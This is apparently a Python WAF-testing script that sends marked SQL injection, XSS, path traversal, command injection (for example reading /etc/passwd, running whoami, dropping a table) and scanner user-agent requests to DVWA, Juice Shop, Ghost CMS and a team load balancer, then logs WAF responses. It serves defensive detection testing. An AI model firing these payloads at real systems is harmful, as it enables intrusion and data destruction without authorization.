#!/usr/bin/env python3
"""
attack_runner.py — WAF 로그 생성용 공격 시뮬레이터

자체 구축한 인가된 테스트 대상(DVWA / JuiceShop / Ghost CMS / 팀 ALB) 전용 도구.
SQLi / XSS / Path Traversal / Command Injection / Scanner-UA 패턴을
대상 서버로 전송해서, 앞단 WAF가 BLOCK/COUNT 로그를 남기도록 유도한다.

각 요청에는 고유 마커 헤더(X-Attack-Sim)와 쿼리 마커(asid)를 박는다.
→ WAF 로그(S3)에서 이 마커로 "내가 보낸 공격"을 정확히 찾아낼 수 있다.

표준 라이브러리만 사용 (clone 후 추가 설치 없이 바로 실행).

사용 예:
    python attack_runner.py --dry-run                       # 안 보내고 목록만 출력
    python attack_runner.py                                 # 전체 1회씩 전송 (ALB 대상)
    python attack_runner.py --app dvwa                      # DVWA만
    python attack_runner.py --app juiceshop                 # JuiceShop만
    python attack_runner.py --app ghost                     # Ghost CMS (localhost:2368)
    python attack_runner.py --app ghost --target http://..  # Ghost EC2 ALB 경유
    python attack_runner.py --category sqli xss             # 특정 유형만
    python attack_runner.py --count 3 --delay 0.5           # 각 패턴 3회, 0.5초 간격
"""
import argparse
import json
import os
import sys
import time
import uuid
from datetime import datetime, timezone
from urllib.parse import quote
from urllib.request import Request, urlopen
from urllib.error import HTTPError, URLError

DEFAULT_TARGET        = "http://cloud-sec-alb-664622103.ap-northeast-2.elb.amazonaws.com"
DEFAULT_TARGET_DVWA   = DEFAULT_TARGET          # DVWA 경로 기반
DEFAULT_TARGET_JUICE  = DEFAULT_TARGET          # JuiceShop은 /rest API 기반
DEFAULT_TARGET_GHOST  = "http://localhost:2368" # Ghost CMS (로컬: 2368, EC2: ALB 경로로 변경)
_SCRIPT_DIR           = os.path.dirname(os.path.abspath(__file__))
DEFAULT_OUTPUT        = os.path.join(_SCRIPT_DIR, "output", "sent_attacks.jsonl")

# 공격 카탈로그 — DVWA 경로 기반 (WAF 앞단 공통)
# 각 항목: (이름, HTTP 메서드, 경로, 추가 헤더)
ATTACKS = {
    "sqli": [
        ("sqli-boolean", "GET", "/vulnerabilities/sqli/?id=1' OR '1'='1&Submit=Submit", {}),
        ("sqli-union",   "GET", "/?id=1 UNION SELECT username,password FROM users-- -", {}),
        ("sqli-stacked", "GET", "/?id=1; DROP TABLE users-- -", {}),
    ],
    "xss": [
        ("xss-script", "GET", "/?q=<script>alert(1)</script>", {}),
        ("xss-img",    "GET", '/?search="><img src=x onerror=alert(1)>', {}),
        ("xss-svg",    "GET", "/?name=<svg/onload=alert(document.cookie)>", {}),
    ],
    "path_traversal": [
        ("lfi-passwd",  "GET", "/?file=../../../../etc/passwd", {}),
        ("lfi-encoded", "GET", "/?page=....//....//....//etc/passwd", {}),
    ],
    "command_injection": [
        ("cmdi-semicolon", "GET", "/?host=127.0.0.1;cat /etc/passwd", {}),
        ("cmdi-pipe",      "GET", "/?ip=127.0.0.1|whoami", {}),
    ],
    "scanner_ua": [
        ("ua-sqlmap", "GET", "/", {"User-Agent": "sqlmap/1.7.2#stable (https://sqlmap.org)"}),
        ("ua-nikto",  "GET", "/", {"User-Agent": "Mozilla/5.00 (Nikto/2.1.6)"}),
    ],
}

# JuiceShop 전용 공격 카탈로그 — REST API 기반
# OWASP Juice Shop의 실제 취약 엔드포인트를 대상으로 함
ATTACKS_JUICESHOP = {
    "sqli": [
        # /rest/products/search — SQLi 취약점 (OWASP Top 10 A03)
        ("juice-sqli-search",  "GET",  "/rest/products/search?q=')) UNION SELECT * FROM Users--", {}),
        ("juice-sqli-login",   "POST", "/rest/user/login",
         {"Content-Type": "application/json", "_body": '{"email":"admin\' OR 1=1--","password":"x"}'}),
    ],
    "xss": [
        # XSS via search/product name (DOM-based)
        ("juice-xss-search",   "GET",  "/rest/products/search?q=<script>alert(1)</script>", {}),
        ("juice-xss-feedback", "POST", "/api/Feedbacks/",
         {"Content-Type": "application/json", "_body": '{"comment":"<img src=x onerror=alert(1)>","rating":5}'}),
    ],
    "path_traversal": [
        # 파일 노출 엔드포인트
        ("juice-lfi-ftp",      "GET",  "/ftp/../etc/passwd", {}),
        ("juice-lfi-support",  "GET",  "/support/logs/../../../../etc/shadow", {}),
    ],
    "broken_access": [
        # 인증 없이 관리자 API 접근 시도 (OWASP A01 Broken Access Control)
        ("juice-admin-panel",  "GET",  "/administration", {}),
        ("juice-user-list",    "GET",  "/api/Users/",     {"Authorization": "Bearer invalid_token"}),
    ],
    "scanner_ua": [
        ("juice-ua-burp",   "GET", "/", {"User-Agent": "Mozilla/5.0 (compatible; BurpSuite)"}),
        ("juice-ua-owasp",  "GET", "/", {"User-Agent": "OWASP ZAP/2.14.0"}),
    ],
}


# Ghost CMS 공격 카탈로그
# 목적: (1) 정상 트래픽 FP 기준선 — 오탐 검출  (2) 공격 패턴 → WAF 차단 여부 확인
ATTACKS_GHOST = {
    # 정상 블로그 트래픽 — WAF가 차단하면 오탐(FP)으로 판정
    "normal": [
        ("ghost-home",      "GET", "/",                        {}),
        ("ghost-rss",       "GET", "/rss/",                    {}),
        ("ghost-sitemap",   "GET", "/sitemap.xml",             {}),
        ("ghost-content",   "GET", "/ghost/api/content/posts/?key=none", {}),
        ("ghost-members",   "GET", "/members/",                {}),
        ("ghost-tag",       "GET", "/tag/getting-started/",    {}),
    ],
    # 관리 패널 접근 시도 — 정상 차단 or 401/302 예상 (오탐 아님)
    "admin_probe": [
        ("ghost-admin-ui",      "GET",  "/ghost/",              {}),
        ("ghost-admin-api",     "GET",  "/ghost/api/v3/admin/", {}),
        ("ghost-admin-login",   "POST", "/ghost/api/v3/admin/session",
         {"Content-Type": "application/json",
          "_body": '{"username":"admin","password":"admin"}'}),
    ],
    "sqli": [
        ("ghost-sqli-filter", "GET",
         "/ghost/api/content/posts/?filter=id:1' OR '1'='1&key=none", {}),
        ("ghost-sqli-slug",   "GET",
         "/ghost/api/content/posts/slug/test' UNION SELECT 1--/?key=none", {}),
    ],
    "xss": [
        ("ghost-xss-tag",    "GET", "/tag/<script>alert(1)</script>/", {}),
        ("ghost-xss-search", "GET", "/?s=<img src=x onerror=alert(1)>", {}),
    ],
    "scanner_ua": [
        ("ghost-ua-nmap",      "GET", "/",
         {"User-Agent": "Nmap Scripting Engine"}),
        ("ghost-ua-dirbuster", "GET", "/ghost/../etc/passwd",
         {"User-Agent": "DirBuster-1.0-RC1"}),
    ],
}


def build_url(target: str, path: str) -> str:
    """경로의 쿼리 값 부분만 안전하게 인코딩해서 전체 URL을 만든다."""
    if "?" in path:
        base, query = path.split("?", 1)
    else:
        base, query = path, ""
    if not query:
        return target + base
    encoded_pairs = []
    for pair in query.split("&"):
        if "=" in pair:
            k, v = pair.split("=", 1)
            encoded_pairs.append(f"{k}={quote(v, safe='')}")
        else:
            encoded_pairs.append(pair)
    return f"{target}{base}?{'&'.join(encoded_pairs)}"


def send_one(target, category, name, method, path, extra_headers, timeout, body=None):
    """공격 1건 전송. 결과 dict 반환(네트워크 실패도 결과로 기록)."""
    asid = f"{name}-{uuid.uuid4().hex[:8]}"
    sep = "&" if "?" in path else "?"
    url = build_url(target, f"{path}{sep}asid={asid}")
    headers = {
        "User-Agent": "attack-sim/1.0",
        "X-Attack-Sim": asid,
        "X-Attack-Category": category,
    }
    headers.update(extra_headers)

    record = {
        "asid": asid,
        "sent_at": datetime.now(timezone.utc).isoformat(),
        "category": category,
        "name": name,
        "method": method,
        "url": url,
    }

    encoded_body = body.encode() if isinstance(body, str) else body
    req = Request(url, data=encoded_body, method=method, headers=headers)
    started = time.perf_counter()
    try:
        with urlopen(req, timeout=timeout) as resp:
            record["status"] = resp.status
            record["waf_action"] = "ALLOWED_OR_COUNTED"
    except HTTPError as e:
        record["status"] = e.code
        record["waf_action"] = "LIKELY_BLOCKED" if e.code == 403 else f"HTTP_{e.code}"
    except URLError as e:
        record["status"] = None
        record["waf_action"] = "NETWORK_ERROR"
        record["error"] = str(e.reason)
    record["elapsed_ms"] = round((time.perf_counter() - started) * 1000, 1)
    return record


def main():
    parser = argparse.ArgumentParser(description="WAF 로그 생성용 공격 시뮬레이터")
    parser.add_argument("--target",   default=DEFAULT_TARGET, help="대상 베이스 URL")
    parser.add_argument("--app",      default="all",
                        choices=["dvwa", "juiceshop", "ghost", "all"],
                        help="공격 대상 앱 선택 (기본: all — DVWA + JuiceShop + Ghost 모두)")
    parser.add_argument("--category", nargs="*", help="전송할 유형(미지정 시 전체)")
    parser.add_argument("--count",    type=int,   default=1,    help="패턴당 전송 횟수")
    parser.add_argument("--delay",    type=float, default=0.3,  help="요청 간 간격(초)")
    parser.add_argument("--timeout",  type=float, default=10.0, help="요청 타임아웃(초)")
    parser.add_argument("--output",   default=DEFAULT_OUTPUT,   help="전송 기록 저장 경로(JSONL)")
    parser.add_argument("--dry-run",  action="store_true",      help="실제 전송 없이 목록만 출력")
    args = parser.parse_args()

    # 앱 선택에 따라 공격 카탈로그 + 기본 타겟 결정
    if args.app == "juiceshop":
        catalog = ATTACKS_JUICESHOP
        app_label = "OWASP Juice Shop"
        if args.target == DEFAULT_TARGET:
            target_override = DEFAULT_TARGET_JUICE
        else:
            target_override = args.target
    elif args.app == "ghost":
        catalog = ATTACKS_GHOST
        app_label = "Ghost CMS"
        if args.target == DEFAULT_TARGET:
            target_override = DEFAULT_TARGET_GHOST
        else:
            target_override = args.target
    elif args.app == "dvwa":
        catalog = ATTACKS
        app_label = "DVWA"
        target_override = args.target
    else:  # all — DVWA + JuiceShop + Ghost 병합 (Ghost는 별도 타겟이므로 접두사 구분)
        catalog = {
            **ATTACKS,
            **{f"js_{k}": v for k, v in ATTACKS_JUICESHOP.items()},
            **{f"gh_{k}": v for k, v in ATTACKS_GHOST.items()},
        }
        app_label = "DVWA + Juice Shop + Ghost CMS"
        target_override = args.target
        print("[!] all 모드: Ghost 카탈로그도 포함됩니다."
              f" Ghost 요청은 {DEFAULT_TARGET_GHOST} 로 보내려면 --app ghost 를 따로 실행하세요.")

    categories = args.category or list(catalog)
    # 카테고리 필터링 (지정한 것만)
    invalid = [c for c in categories if c not in catalog]
    if invalid:
        print(f"[!] 알 수 없는 카테고리: {invalid}  →  선택 가능: {list(catalog)}", file=sys.stderr)
        return 1

    target = target_override.rstrip("/")

    print(f"[*] 앱        : {app_label}")
    print(f"[*] 대상      : {target}")
    print(f"[*] 유형      : {', '.join(categories)}")
    print(f"[*] 패턴당 횟수: {args.count}  /  간격: {args.delay}s")
    if args.dry_run:
        print("[*] DRY-RUN (실제 전송 안 함)\n")

    results = []
    for category in categories:
        for entry in catalog[category]:
            name, method, path = entry[0], entry[1], entry[2]
            extra_headers = dict(entry[3]) if len(entry) > 3 else {}
            # POST body는 헤더의 _body 키로 전달
            body = extra_headers.pop("_body", None)
            for _ in range(args.count):
                if args.dry_run:
                    print(f"  - [{category:17}] {method} {build_url(target, path)}")
                    continue
                rec = send_one(target, category, name, method, path,
                               extra_headers, args.timeout, body=body)
                results.append(rec)
                flag = {"LIKELY_BLOCKED": "BLOCK", "ALLOWED_OR_COUNTED": "PASS",
                        "NETWORK_ERROR": "ERR "}.get(rec["waf_action"], rec["waf_action"])
                print(f"  [{flag}] {category:20} {rec['name']:20} "
                      f"status={rec['status']} {rec['elapsed_ms']}ms")
                time.sleep(args.delay)

    if args.dry_run or not results:
        return

    os.makedirs(os.path.dirname(args.output) or ".", exist_ok=True)
    with open(args.output, "a", encoding="utf-8") as f:
        for rec in results:
            f.write(json.dumps(rec, ensure_ascii=False) + "\n")

    blocked = sum(1 for r in results if r["waf_action"] == "LIKELY_BLOCKED")
    passed = sum(1 for r in results if r["waf_action"] == "ALLOWED_OR_COUNTED")
    errored = len(results) - blocked - passed
    print(f"\n[*] 전송 완료: 총 {len(results)}건 "
          f"(차단추정 {blocked} / 통과 {passed} / 오류 {errored})")
    print(f"[*] 기록 저장: {args.output}")
    print("[*] 다음: S3에서 WAF 로그 확인 → 위 asid 값으로 내 공격 매칭")


if __name__ == "__main__":
    sys.exit(main())
